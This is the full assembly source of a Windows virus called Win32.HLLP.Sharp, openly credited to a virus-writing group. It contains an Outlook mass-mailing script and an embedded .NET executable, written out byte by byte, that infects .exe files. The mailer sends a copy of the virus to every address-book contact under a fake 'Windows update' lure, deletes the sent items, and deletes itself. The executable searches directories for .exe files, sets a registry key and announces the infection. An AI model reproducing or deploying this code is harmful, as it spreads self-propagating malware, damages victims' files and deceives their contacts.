Win32.HLLP.Sharp
ASM part of the code
; Virus Name: Sharp
; Version: A
; Type: Win32 EXE Prepender
; Author: Gigabyte [Metaphase]
; Homepage: http://coderz.net/gigabyte

.386
.model flat

extrn _lcreat:proc
extrn _lwrite:proc
extrn _lclose:proc
extrn ExitProcess:proc
extrn GetSystemDirectoryA:proc
extrn GetWindowsDirectoryA:proc
extrn SetCurrentDirectoryA:proc
extrn ShellExecuteA:proc
extrn FindFirstFileA:proc
extrn GetModuleHandleA:proc
extrn GetModuleFileNameA:proc
extrn RegSetValueA:proc
extrn lstrlen:proc
extrn WinExec:proc
extrn CopyFileA:proc
extrn ShellExecuteA:proc

size equ CSharpName - CSharpExe
size2 equ CSharpExe - mailscript

.data
VirusName db '[Win32.Sharp]',0
Author db 'Gigabyte/Metaphase',0
mailscript:
	db 'On Error Resume Next',0dh,0ah
	db 'Dim Sharp, Mail, Counter, A, B, C, D, E',0dh,0ah
	db 'Set Sharp = CreateObject ("outlook.application")',0dh,0ah
	db 'Set Mail = Sharp.GetNameSpace ("MAPI")',0dh,0ah
	db 'For A = 1 To Mail.AddressLists.Count',0dh,0ah
	db 'Set B = Mail.AddressLists (A)',0dh,0ah
	db 'Counter = 1',0dh,0ah
	db 'Set C = Sharp.CreateItem (0)',0dh,0ah
	db 'For D = 1 To B.AddressEntries.Count',0dh,0ah
	db 'E = B.AddressEntries (Counter)',0dh,0ah
	db 'C.Recipients.Add E',0dh,0ah
	db 'Counter = Counter + 1',0dh,0ah
	db 'Next',0dh,0ah
	db 'C.Subject = "Important: Windows update"',0dh,0ah
	db 'C.Body = "Hey, at work we are applying this update because it makes Windows over 50% faster and more secure. I thought I should forward it as you may like it."',0dh,0ah
	db 'C.Attachments.Add "c:\MS02-010.exe"',0dh,0ah
	db 'C.DeleteAfterSubmit = True',0dh,0ah
	db 'C.Send',0dh,0ah
	db 'Next',0dh,0ah
	db 'Set C = CreateObject ("Scripting.FileSystemObject")',0dh,0ah
	db 'C.DeleteFile Wscript.ScriptFullName',0dh,0ah
CSharpExe:
  db 77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0
  db 184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0
  db 14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104
  db 105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111
  db 116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32
  db 109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0
  db 80,69,0,0,76,1,3,0,71,142,122,60,0,0,0,0
  db 0,0,0,0,224,0,14,1,11,1,6,0,0,16,0,0
  db 0,12,0,0,0,0,0,0,254,45,0,0,0,32,0,0
  db 0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0
  db 4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0
  db 0,128,0,0,0,2,0,0,0,0,0,0,2,0,0,0
  db 0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0
  db 0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0
  db 176,45,0,0,75,0,0,0,0,64,0,0,64,8,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,96,0,0,12,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,32,0,0,8,0,0,0
  db 0,0,0,0,0,0,0,0,8,32,0,0,72,0,0,0
  db 0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0
  db 4,14,0,0,0,32,0,0,0,16,0,0,0,2,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96
  db 46,114,115,114,99,0,0,0,64,8,0,0,0,64,0,0
  db 0,10,0,0,0,18,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,64,0,0,64,46,114,101,108,111,99,0,0
  db 12,0,0,0,0,96,0,0,0,2,0,0,0,28,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,66
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 224,45,0,0,0,0,0,0,72,0,0,0,2,0,0,0
  db 244,35,0,0,188,9,0,0,1,0,0,0,1,0,0,6
  db 52,35,0,0,192,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 27,48,5,0,106,1,0,0,1,0,0,17,29,40,14,0
  db 0,10,115,15,0,0,10,111,16,0,0,10,10,6,114,1
  db 0,0,112,40,17,0,0,10,115,18,0,0,10,11,7,111
  db 19,0,0,10,12,8,114,23,0,0,112,111,20,0,0,10
  db 8,111,21,0,0,10,40,22,0,0,10,115,15,0,0,10
  db 40,23,0,0,10,111,16,0,0,10,13,31,38,40,14,0
  db 0,10,115,15,0,0,10,111,16,0,0,10,19,4,17,4
  db 114,216,0,0,112,40,24,0,0,10,19,5,9,40,2,0
  db 0,6,17,5,31,11,154,40,2,0,0,6,17,5,31,12
  db 154,40,2,0,0,6,17,5,31,13,154,40,2,0,0,6
  db 126,1,0,0,4,25,23,115,25,0,0,10,19,6,114,224
  db 0,0,112,26,115,26,0,0,10,19,7,17,6,111,27,0
  db 0,10,105,32,0,48,0,0,89,184,141,28,0,0,1,19
  db 8,17,6,32,0,48,0,0,106,22,111,28,0,0,10,38
  db 17,6,17,8,22,17,6,111,27,0,0,10,105,32,0,48
  db 0,0,89,111,29,0,0,10,38,17,7,17,8,22,17,6
  db 111,27,0,0,10,105,32,0,48,0,0,89,111,30,0,0
  db 10,17,7,111,27,0,0,10,19,9,17,7,111,31,0,0
  db 10,17,9,22,106,49,66,126,1,0,0,4,114,242,0,0
  db 112,111,32,0,0,10,45,49,115,33,0,0,10,19,10,17
  db 10,111,34,0,0,10,114,224,0,0,112,111,35,0,0,10
  db 17,10,111,36,0,0,10,38,43,15,114,224,0,0,112,40
  db 37,0,0,10,222,3,38,222,0,114,224,0,0,112,40,38
  db 0,0,10,45,229,42,0,0,1,16,0,0,0,0,78,1
  db 12,90,1,3,1,0,0,1,0,0,0,0,0,0,0,0
  db 0,0,0,0,27,48,5,0,225,0,0,0,2,0,0,17
  db 2,114,12,1,0,112,40,39,0,0,10,10,6,142,105,11
  db 22,12,56,184,0,0,0,6,8,154,13,9,25,23,115,25
  db 0,0,10,19,4,17,4,31,18,106,22,111,28,0,0,10
  db 38,17,4,111,40,0,0,10,19,5,17,4,111,31,0,0
  db 10,17,5,31,103,59,129,0,0,0,9,32,128,0,0,0
  db 40,41,0,0,10,9,114,24,1,0,112,23,40,42,0,0
  db 10,126,1,0,0,4,9,23,40,42,0,0,10,114,24,1
  db 0,112,25,115,26,0,0,10,19,6,9,28,115,26,0,0
  db 10,19,7,17,6,111,27,0,0,10,105,184,141,28,0,0
  db 1,19,8,17,6,17,8,22,17,6,111,27,0,0,10,105
  db 111,29,0,0,10,38,17,7,17,8,22,17,6,111,27,0
  db 0,10,105,111,30,0,0,10,17,6,111,31,0,0,10,17
  db 7,111,31,0,0,10,222,3,38,222,0,8,23,88,12,8
  db 7,63,65,255,255,255,114,24,1,0,112,40,37,0,0,10
  db 42,0,0,0,1,16,0,0,0,0,74,0,126,200,0,3
  db 1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0
  db 19,48,2,0,36,0,0,0,0,0,0,0,126,43,0,0
  db 10,114,50,1,0,112,111,44,0,0,10,114,80,1,0,112
  db 111,45,0,0,10,116,19,0,0,1,128,1,0,0,4,42
  db 19,48,1,0,7,0,0,0,0,0,0,0,2,40,46,0
  db 0,10,42,0,188,0,0,0,206,202,239,190,1,0,0,0
  db 158,0,0,0,41,83,121,115,116,101,109,46,82,101,115,111
  db 117,114,99,101,115,46,82,101,115,111,117,114,99,101,82,101
  db 97,100,101,114,44,32,109,115,99,111,114,108,105,98,115,83
  db 121,115,116,101,109,46,82,101,115,111,117,114,99,101,115,46
  db 82,117,110,116,105,109,101,82,101,115,111,117,114,99,101,83
  db 101,116,44,32,109,115,99,111,114,108,105,98,44,32,86,101
  db 114,115,105,111,110,61,49,46,48,46,51,51,48,48,46,48
  db 44,32,67,117,108,116,117,114,101,61,110,101,117,116,114,97
  db 108,44,32,80,117,98,108,105,99,75,101,121,84,111,107,101
  db 110,61,98,55,55,97,53,99,53,54,49,57,51,52,101,48
  db 56,57,1,0,0,0,0,0,0,0,0,0,0,0,80,65
  db 188,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0
  db 12,0,0,0,118,49,46,48,46,51,55,48,53,0,0,0
  db 0,0,5,0,108,0,0,0,44,3,0,0,35,126,0,0
  db 152,3,0,0,228,3,0,0,35,83,116,114,105,110,103,115
  db 0,0,0,0,124,7,0,0,84,1,0,0,35,85,83,0
  db 208,8,0,0,16,0,0,0,35,71,85,73,68,0,0,0
  db 224,8,0,0,220,0,0,0,35,66,108,111,98,0,0,0
  db 0,0,0,0,1,0,0,1,87,21,2,0,9,1,0,0
  db 0,250,1,51,0,2,0,0,1,0,0,0,35,0,0,0
  db 2,0,0,0,1,0,0,0,4,0,0,0,1,0,0,0
  db 46,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0
  db 2,0,0,0,1,0,0,0,0,0,10,0,1,0,0,0
  db 0,0,6,0,36,0,29,0,6,0,104,0,86,0,6,0
  db 129,0,86,0,6,0,154,0,86,0,6,0,181,0,86,0
  db 6,0,206,0,86,0,6,0,231,0,86,0,6,0,2,1
  db 86,0,6,0,29,1,86,0,6,0,54,1,86,0,6,0
  db 79,1,86,0,6,0,110,1,86,0,6,0,139,1,86,0
  db 6,0,162,1,29,0,6,0,181,1,29,0,63,0,193,1
  db 0,0,6,0,231,1,221,1,6,0,245,1,221,1,6,0
  db 17,2,29,0,6,0,31,2,221,1,6,0,40,2,221,1
  db 6,0,64,2,221,1,6,0,118,2,221,1,6,0,143,2
  db 221,1,6,0,154,2,221,1,6,0,163,2,221,1,6,0
  db 174,2,221,1,6,0,192,2,29,0,6,0,197,2,221,1
  db 10,0,246,2,227,2,10,0,254,2,227,2,6,0,48,3
  db 221,1,6,0,102,3,221,1,6,0,152,3,136,3,6,0
  db 161,3,136,3,0,0,0,0,1,0,0,0,0,0,1,0
  db 1,0,1,0,16,0,43,0,43,0,5,0,1,0,1,0
  db 17,0,49,0,10,0,80,32,0,0,0,0,145,0,57,0
  db 13,0,1,0,228,33,0,0,0,0,145,0,62,0,17,0
  db 1,0,240,34,0,0,0,0,145,24,73,0,13,0,2,0
  db 32,35,0,0,0,0,134,24,80,0,22,0,2,0,0,0
  db 1,0,67,3,17,0,80,0,26,0,25,0,80,0,26,0
  db 33,0,80,0,31,0,41,0,80,0,26,0,49,0,80,0
  db 26,0,57,0,80,0,26,0,65,0,80,0,26,0,73,0
  db 80,0,26,0,81,0,80,0,26,0,89,0,80,0,26,0
  db 97,0,80,0,26,0,105,0,80,0,26,0,113,0,80,0
  db 22,0,121,0,207,1,41,0,137,0,80,0,26,0,145,0
  db 4,2,47,0,153,0,24,2,51,0,161,0,80,0,26,0
  db 161,0,53,2,57,0,177,0,75,2,26,0,177,0,81,2
  db 22,0,121,0,87,2,62,0,137,0,107,2,66,0,185,0
  db 128,2,71,0,193,0,80,0,78,0,193,0,80,0,87,0
  db 217,0,181,2,94,0,217,0,208,2,98,0,217,0,213,2
  db 105,0,217,0,75,2,113,0,217,0,81,2,22,0,153,0
  db 218,2,121,0,241,0,80,0,22,0,241,0,15,3,126,0
  db 249,0,29,3,26,0,241,0,42,3,131,0,1,1,53,3
  db 17,0,1,1,60,3,135,0,185,0,84,3,71,0,217,0
  db 93,3,161,0,1,1,117,3,165,0,1,1,131,3,173,0
  db 17,1,173,3,197,0,25,1,186,3,202,0,25,1,197,3
  db 209,0,9,0,80,0,22,0,32,0,107,0,36,0,46,0
  db 59,0,214,0,46,0,19,0,214,0,46,0,27,0,214,0
  db 46,0,51,0,214,0,46,0,11,0,214,0,46,0,67,0
  db 214,0,46,0,75,0,214,0,46,0,83,0,214,0,46,0
  db 91,0,214,0,46,0,99,0,214,0,140,0,180,0,4,128
  db 0,0,1,0,0,0,18,3,235,142,0,0,0,0,0,0
  db 43,0,0,0,1,0,0,0,228,12,0,0,0,0,0,0
  db 1,0,20,0,0,0,0,0,1,0,0,0,228,12,0,0
  db 0,0,0,0,1,0,29,0,0,0,0,0,0,0,0,0
  db 1,0,0,0,206,3,0,0,0,0,0,0,0,60,77,111
  db 100,117,108,101,62,0,83,104,97,114,112,46,101,120,101,0
  db 109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0
  db 79,98,106,101,99,116,0,83,104,97,114,112,0,118,105,114
  db 110,97,109,101,0,77,97,105,110,0,70,105,108,101,83,101
  db 97,114,99,104,0,46,99,99,116,111,114,0,46,99,116,111
  db 114,0,83,121,115,116,101,109,46,82,101,102,108,101,99,116
  db 105,111,110,0,65,115,115,101,109,98,108,121,75,101,121,78
  db 97,109,101,65,116,116,114,105,98,117,116,101,0,65,115,115
  db 101,109,98,108,121,75,101,121,70,105,108,101,65,116,116,114
  db 105,98,117,116,101,0,65,115,115,101,109,98,108,121,68,101
  db 108,97,121,83,105,103,110,65,116,116,114,105,98,117,116,101
  db 0,65,115,115,101,109,98,108,121,86,101,114,115,105,111,110
  db 65,116,116,114,105,98,117,116,101,0,65,115,115,101,109,98
  db 108,121,67,117,108,116,117,114,101,65,116,116,114,105,98,117
  db 116,101,0,65,115,115,101,109,98,108,121,84,114,97,100,101
  db 109,97,114,107,65,116,116,114,105,98,117,116,101,0,65,115
  db 115,101,109,98,108,121,67,111,112,121,114,105,103,104,116,65
  db 116,116,114,105,98,117,116,101,0,65,115,115,101,109,98,108
  db 121,80,114,111,100,117,99,116,65,116,116,114,105,98,117,116
  db 101,0,65,115,115,101,109,98,108,121,67,111,109,112,97,110
  db 121,65,116,116,114,105,98,117,116,101,0,65,115,115,101,109
  db 98,108,121,67,111,110,102,105,103,117,114,97,116,105,111,110
  db 65,116,116,114,105,98,117,116,101,0,65,115,115,101,109,98
  db 108,121,68,101,115,99,114,105,112,116,105,111,110,65,116,116
  db 114,105,98,117,116,101,0,65,115,115,101,109,98,108,121,84
  db 105,116,108,101,65,116,116,114,105,98,117,116,101,0,83,84
  db 65,84,104,114,101,97,100,65,116,116,114,105,98,117,116,101
  db 0,69,110,118,105,114,111,110,109,101,110,116,0,83,112,101
  db 99,105,97,108,70,111,108,100,101,114,0,71,101,116,70,111
  db 108,100,101,114,80,97,116,104,0,83,121,115,116,101,109,46
  db 73,79,0,68,105,114,101,99,116,111,114,121,73,110,102,111
  db 0,70,105,108,101,83,121,115,116,101,109,73,110,102,111,0
  db 103,101,116,95,70,117,108,108,78,97,109,101,0,83,116,114
  db 105,110,103,0,67,111,110,99,97,116,0,70,105,108,101,73
  db 110,102,111,0,83,116,114,101,97,109,87,114,105,116,101,114
  db 0,67,114,101,97,116,101,84,101,120,116,0,84,101,120,116
  db 87,114,105,116,101,114,0,87,114,105,116,101,0,67,108,111
  db 115,101,0,103,101,116,95,83,121,115,116,101,109,68,105,114
  db 101,99,116,111,114,121,0,103,101,116,95,80,97,114,101,110
  db 116,0,68,105,114,101,99,116,111,114,121,0,71,101,116,68
  db 105,114,101,99,116,111,114,105,101,115,0,70,105,108,101,83
  db 116,114,101,97,109,0,70,105,108,101,77,111,100,101,0,70
  db 105,108,101,65,99,99,101,115,115,0,83,116,114,101,97,109
  db 0,103,101,116,95,76,101,110,103,116,104,0,66,121,116,101
  db 0,83,101,101,107,79,114,105,103,105,110,0,83,101,101,107
  db 0,82,101,97,100,0,69,110,100,115,87,105,116,104,0,83
  db 121,115,116,101,109,46,68,105,97,103,110,111,115,116,105,99
  db 115,0,80,114,111,99,101,115,115,0,80,114,111,99,101,115
  db 115,83,116,97,114,116,73,110,102,111,0,103,101,116,95,83
  db 116,97,114,116,73,110,102,111,0,115,101,116,95,70,105,108
  db 101,78,97,109,101,0,83,116,97,114,116,0,70,105,108,101
  db 0,68,101,108,101,116,101,0,69,120,105,115,116,115,0,68
  db 105,114,101,99,116,111,114,121,84,111,67,104,101,99,107,0
  db 71,101,116,70,105,108,101,115,0,82,101,97,100,66,121,116
  db 101,0,70,105,108,101,65,116,116,114,105,98,117,116,101,115
  db 0,83,101,116,65,116,116,114,105,98,117,116,101,115,0,67
  db 111,112,121,0,77,105,99,114,111,115,111,102,116,46,87,105
  db 110,51,50,0,82,101,103,105,115,116,114,121,0,82,101,103
  db 105,115,116,114,121,75,101,121,0,76,111,99,97,108,77,97
  db 99,104,105,110,101,0,79,112,101,110,83,117,98,75,101,121
  db 0,71,101,116,86,97,108,117,101,0,83,104,97,114,112,46
  db 83,104,97,114,112,46,114,101,115,111,117,114,99,101,115,0
  db 0,21,92,0,83,0,104,0,97,0,114,0,112,0,46,0
  db 118,0,98,0,115,0,0,128,191,77,0,115,0,103,0,66
  db 0,111,0,120,0,32,0,34,0,89,0,111,0,117,0,39
  db 0,114,0,101,0,32,0,105,0,110,0,102,0,101,0,99
  db 0,116,0,101,0,100,0,32,0,119,0,105,0,116,0,104
  db 0,32,0,87,0,105,0,110,0,51,0,50,0,46,0,72
  db 0,76,0,76,0,80,0,46,0,83,0,104,0,97,0,114
  db 0,112,0,44,0,32,0,119,0,114,0,105,0,116,0,116
  db 0,101,0,110,0,32,0,105,0,110,0,32,0,67,0,35
  db 0,44,0,32,0,98,0,121,0,32,0,71,0,105,0,103
  db 0,97,0,98,0,121,0,116,0,101,0,47,0,77,0,101
  db 0,116,0,97,0,112,0,104,0,97,0,115,0,101,0,34
  db 0,44,0,54,0,52,0,44,0,34,0,83,0,104,0,97
  db 0,114,0,112,0,34,0,1,7,42,0,46,0,42,0,0
  db 17,116,0,101,0,109,0,112,0,46,0,101,0,120,0,101
  db 0,0,25,77,0,83,0,48,0,50,0,45,0,48,0,49
  db 0,48,0,46,0,101,0,120,0,101,0,1,11,42,0,46
  db 0,101,0,120,0,101,0,0,25,104,0,111,0,115,0,116
  db 0,99,0,111,0,112,0,121,0,46,0,101,0,120,0,101
  db 0,0,29,83,0,111,0,102,0,116,0,119,0,97,0,114
  db 0,101,0,92,0,83,0,104,0,97,0,114,0,112,0,0
  db 1,0,0,0,203,66,44,131,241,16,67,79,183,201,134,235
  db 147,189,189,183,0,8,183,122,92,86,25,52,224,137,2,6
  db 14,3,0,0,1,4,0,1,1,14,3,32,0,1,4,32
  db 1,1,14,4,32,1,1,2,4,1,0,0,0,5,0,1
  db 14,17,65,3,32,0,14,5,0,2,14,14,14,4,32,0
  db 18,85,3,0,0,14,4,32,0,18,69,6,0,2,29,14
  db 14,14,8,32,3,1,14,17,101,17,105,6,32,2,1,14
  db 17,101,3,32,0,10,6,32,2,10,10,17,117,7,32,3
  db 8,29,5,8,8,7,32,3,1,29,5,8,8,4,32,1
  db 2,14,4,32,0,18,125,3,32,0,2,4,0,1,2,14
  db 20,7,11,14,18,81,18,85,14,14,29,14,18,97,18,97
  db 29,5,10,18,121,3,32,0,8,7,0,2,1,14,17,128
  db 133,6,0,3,1,14,14,2,16,7,9,29,14,8,8,14
  db 18,97,8,18,97,18,97,29,5,4,6,18,128,141,6,32
  db 1,18,128,141,14,4,32,1,28,14,5,1,0,0,0,0
  db 216,45,0,0,0,0,0,0,0,0,0,0,238,45,0,0
  db 0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,224,45,0,0,0,0,0,0
  db 0,0,95,67,111,114,69,120,101,77,97,105,110,0,109,115
  db 99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37
  db 0,32,64,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0
  db 3,0,0,0,40,0,0,128,14,0,0,0,72,0,0,128
  db 16,0,0,0,96,0,0,128,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,2,0,2,0,0,0,120,0,0,128
  db 3,0,0,0,144,0,0,128,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,1,0,0,127,0,0,168,0,0,128
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
  db 1,0,0,0,192,0,0,128,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,1,0,0,0,0,0,216,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
  db 0,0,0,0,232,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,1,0,0,0,0,0,248,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
  db 0,0,0,0,8,1,0,0,8,68,0,0,232,2,0,0
  db 0,0,0,0,0,0,0,0,240,70,0,0,40,1,0,0
  db 0,0,0,0,0,0,0,0,24,72,0,0,34,0,0,0
  db 0,0,0,0,0,0,0,0,24,65,0,0,240,2,0,0
  db 0,0,0,0,0,0,0,0,240,2,52,0,0,0,86,0
  db 83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0
  db 78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0
  db 189,4,239,254,0,0,1,0,0,0,1,0,235,142,18,3
  db 0,0,1,0,235,142,18,3,63,0,0,0,0,0,0,0
  db 4,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,68,0,0,0,1,0,86,0,97,0,114,0
  db 70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0
  db 0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0
  db 110,0,115,0,108,0,97,0,116,0,105,0,111,0,110,0
  db 0,0,0,0,0,0,176,4,80,2,0,0,1,0,83,0
  db 116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0
  db 101,0,73,0,110,0,102,0,111,0,0,0,44,2,0,0
  db 1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0
  db 48,0,0,0,28,0,2,0,1,0,67,0,111,0,109,0
  db 109,0,101,0,110,0,116,0,115,0,0,0,32,0,0,0
  db 36,0,2,0,1,0,67,0,111,0,109,0,112,0,97,0
  db 110,0,121,0,78,0,97,0,109,0,101,0,0,0,0,0
  db 32,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0
  db 101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0
  db 116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0
  db 60,0,14,0,1,0,70,0,105,0,108,0,101,0,86,0
  db 101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0
  db 49,0,46,0,48,0,46,0,55,0,56,0,54,0,46,0
  db 51,0,54,0,53,0,56,0,55,0,0,0,52,0,10,0
  db 1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0
  db 108,0,78,0,97,0,109,0,101,0,0,0,83,0,104,0
  db 97,0,114,0,112,0,46,0,101,0,120,0,101,0,0,0
  db 40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0
  db 67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0
  db 116,0,0,0,32,0,0,0,44,0,2,0,1,0,76,0
  db 101,0,103,0,97,0,108,0,84,0,114,0,97,0,100,0
  db 101,0,109,0,97,0,114,0,107,0,115,0,0,0,0,0
  db 32,0,0,0,60,0,10,0,1,0,79,0,114,0,105,0
  db 103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0
  db 101,0,110,0,97,0,109,0,101,0,0,0,83,0,104,0
  db 97,0,114,0,112,0,46,0,101,0,120,0,101,0,0,0
  db 36,0,2,0,1,0,80,0,114,0,111,0,100,0,117,0
  db 99,0,116,0,78,0,97,0,109,0,101,0,0,0,0,0
  db 32,0,0,0,64,0,14,0,1,0,80,0,114,0,111,0
  db 100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0
  db 105,0,111,0,110,0,0,0,49,0,46,0,48,0,46,0
  db 55,0,56,0,54,0,46,0,51,0,54,0,53,0,56,0
  db 55,0,0,0,68,0,14,0,1,0,65,0,115,0,115,0
  db 101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0
  db 114,0,115,0,105,0,111,0,110,0,0,0,49,0,46,0
  db 48,0,46,0,55,0,56,0,54,0,46,0,51,0,54,0
  db 53,0,56,0,55,0,0,0,40,0,0,0,32,0,0,0
  db 64,0,0,0,1,0,4,0,0,0,0,0,128,2,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,128,0,0,128,0,0,0,128,128,0
  db 128,0,0,0,128,0,128,0,128,128,0,0,128,128,128,0
  db 192,192,192,0,0,0,255,0,0,255,0,0,0,255,255,0
  db 255,0,0,0,255,0,255,0,255,255,0,0,255,255,255,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,119,119,119,119,119,119,119,119,119,119,119,119,119,119,112
  db 4,68,68,68,68,68,68,68,68,68,68,68,68,68,68,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,255,255,255,255,255,255,255,255,255,255,255,255,255,244,112
  db 4,136,136,136,136,136,136,136,136,136,136,136,136,136,132,112
  db 4,68,68,68,68,68,68,68,68,68,68,68,68,68,68,112
  db 4,76,76,76,76,76,76,76,76,76,78,206,206,73,116,112
  db 4,204,204,204,204,204,204,204,204,204,204,204,204,204,196,0
  db 0,68,68,68,68,68,68,68,68,68,68,68,68,68,64,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255
  db 192,0,0,1,128,0,0,1,128,0,0,1,128,0,0,1
  db 128,0,0,1,128,0,0,1,128,0,0,1,128,0,0,1
  db 128,0,0,1,128,0,0,1,128,0,0,1,128,0,0,1
  db 128,0,0,1,128,0,0,1,128,0,0,1,128,0,0,1
  db 128,0,0,1,128,0,0,1,128,0,0,1,128,0,0,1
  db 128,0,0,1,128,0,0,1,128,0,0,1,128,0,0,3
